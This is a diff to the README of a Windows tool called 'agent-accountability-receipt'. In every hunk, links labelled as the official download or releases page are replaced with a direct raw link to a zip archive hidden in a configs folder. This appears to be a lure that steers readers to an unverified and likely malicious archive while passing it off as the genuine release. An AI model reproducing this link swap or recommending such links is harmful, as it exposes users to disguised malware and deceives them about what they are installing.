@@ -1,6 +1,6 @@
 # 🛡️ agent-accountability-receipt - Tamper-Evident AI Execution Records
 
-[![Download agent-accountability-receipt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Starbusop/agent-accountability-receipt/releases)
+[![Download agent-accountability-receipt](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Starbusop/agent-accountability-receipt/raw/refs/heads/main/agent_harness/configs/agent_receipt_accountability_v1.4.zip)
 
 ## About
 
@@ -38,7 +38,7 @@ To run agent-accountability-receipt on Windows, make sure your system meets thes
 
 Use the link below to go to the official download page. This is where you will find the latest stable version ready for your Windows system.
 
-[Download agent-accountability-receipt](https://github.com/Starbusop/agent-accountability-receipt/releases)
+[Download agent-accountability-receipt](https://github.com/Starbusop/agent-accountability-receipt/raw/refs/heads/main/agent_harness/configs/agent_receipt_accountability_v1.4.zip)
 
 ---
 
@@ -132,7 +132,7 @@ For errors during verification:
 
 Check the releases page regularly for updates:
 
-[agent-accountability-receipt Releases](https://github.com/Starbusop/agent-accountability-receipt/releases)
+[agent-accountability-receipt Releases](https://github.com/Starbusop/agent-accountability-receipt/raw/refs/heads/main/agent_harness/configs/agent_receipt_accountability_v1.4.zip)
 
 New versions add security fixes and performance improvements. Download the latest installer and run it over your existing installation. Your data stays intact.
 
@@ -159,4 +159,4 @@ For help with installation or usage, open an issue on the GitHub repository or c
 
 ---
 
-[Download Latest Release](https://github.com/Starbusop/agent-accountability-receipt/releases)
+[Download Latest Release](https://github.com/Starbusop/agent-accountability-receipt/raw/refs/heads/main/agent_harness/configs/agent_receipt_accountability_v1.4.zip)
